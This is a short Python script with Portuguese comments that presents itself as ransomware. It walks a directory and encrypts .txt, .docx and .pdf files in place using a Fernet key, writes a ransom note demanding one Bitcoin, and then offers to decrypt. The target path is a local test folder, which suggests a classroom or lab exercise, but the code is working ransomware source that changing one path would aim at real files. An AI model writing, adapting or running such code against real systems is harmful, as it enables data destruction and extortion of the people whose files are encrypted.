import os
from cryptography.fernet import Fernet

# Guarde isso em um lugar seguro!

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_arquivo:
        chave_arquivo.write(chave)

#2. Carregar a chave de criptografia        
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptografar um arquivo
def criptografar_arquivo(nome_arquivo, chave):
    f = Fernet(chave)
    with open(nome_arquivo, "rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_criptografado = f.encrypt(conteudo)
    with open(nome_arquivo, "wb") as arquivo:
        arquivo.write(conteudo_criptografado)

#4. Encontrar arquivo para criptografar        
def encontrar_arquivos(caminho):
    arquivos_para_criptografar = []
    for root, dirs, files in os.walk(caminho):
        for file in files:
            if file.endswith((".txt", ".docx", ".pdf")):  # Adicione outras extensões conforme necessário
                arquivos_para_criptografar.append(os.path.join(root, file))
    return arquivos_para_criptografar

#5. Mensagem de resgate e mensagem
def criar_mensagem_resgate():
    with open("mensagem_resgate.txt", "w") as arquivo:
        arquivo.write("Seus arquivos foram criptografados! Para recuperá-los, envie 1 Bitcoin para o endereço XYZ e entre em contato com nós em\n")
        arquivo.write("Depois disso, enviaremos a chave para você recuperar os dados\n")

#6. Função para descriptografar o arquivo        
def descriptografar_arquivo(nome_arquivo, chave):
    f = Fernet(chave)
    with open(nome_arquivo, "rb") as arquivo:
        conteudo_criptografado = arquivo.read()
    conteudo_original = f.decrypt(conteudo_criptografado)
    with open(nome_arquivo, "wb") as arquivo:
        arquivo.write(conteudo_original)


#7. Função para executar o ransomware
def main():
    gerar_chave()
    chave = carregar_chave()
    caminho = r"C:\Users\robertoj\Cyberdio-me\test_files" # Especificar o diretório neste caso de teste para evitar problemas de permissão e segurança
    arquivos = encontrar_arquivos(caminho)
    
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)

    criar_mensagem_resgate()
    print("Ransomware executado com sucesso! Seus arquivos foram criptografados e a mensagem de resgate foi criada.")

#8. Adicional para descriptografar os arquivos
    opcao = input("Deseja descriptografar os arquivos agora? (s/n): ")
    if opcao == "s":
       for arquivo in arquivos:
         descriptografar_arquivo(arquivo, chave)
       print("Arquivos recuperados com sucesso!")     

if __name__ == "__main__":
    main() 

